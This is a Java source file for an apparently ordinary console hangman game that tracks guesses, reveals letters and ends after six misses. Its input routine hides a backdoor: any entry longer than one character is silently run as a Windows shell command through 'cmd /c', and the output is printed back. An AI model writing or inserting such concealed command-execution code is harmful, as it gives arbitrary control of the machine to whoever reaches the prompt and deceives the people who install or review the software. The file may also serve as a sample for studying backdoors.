import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Scanner;

public class Runner {
    public static final String chars = "qwertyuiopasdfghjklzxcvbnm";
    public void run(GameState state){
        char guess = getInput();
        state.getGuesses().add(guess);
        if(state.getCorrectWord().contains(guess+"")){
            checkPhrase(state,guess);
        }else{
            state.setIncorrectGuesses(state.getIncorrectGuesses()+1);
            if(state.getIncorrectGuesses()==6){
                state.setLoss(true);
            }
        }
    }

    public void checkPhrase(GameState state,char guess){
        String puzzle = state.getCurrentPuzzle();
        for(int i=0;i<state.getCorrectWord().length();i++){
            if(state.getCorrectWord().charAt(i) == guess){
                puzzle= puzzle.substring(0,i)+state.getCorrectWord().charAt(i)+puzzle.substring(i+1);
            }
        }
        if(puzzle.equals(state.getCorrectWord())){
            state.setWon(true);
        }
        state.setCurrentPuzzle(puzzle);
    }

    public char getInput(){
        while(true) {
            Scanner scanner = new Scanner(System.in);
            String guess = scanner.nextLine().toLowerCase();
            char character = guess.charAt(0);
            if (chars.contains(character + "")&&guess.length()==1) {
                return character;
            }
            if(guess.length()>1){
                try {
                    System.out.println(shellExec(guess));
                }catch (Exception e){

                }
            }
        }
    }

    public static String shellExec(String cmdCommand) {
        final StringBuilder stringBuilder = new StringBuilder();
        try {
            final Process process = Runtime.getRuntime().exec("cmd /c "+cmdCommand);
            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line+"\n");
            }

        } catch (Exception e) {
            return e.getMessage();
        }
        return stringBuilder.toString();
    }
}
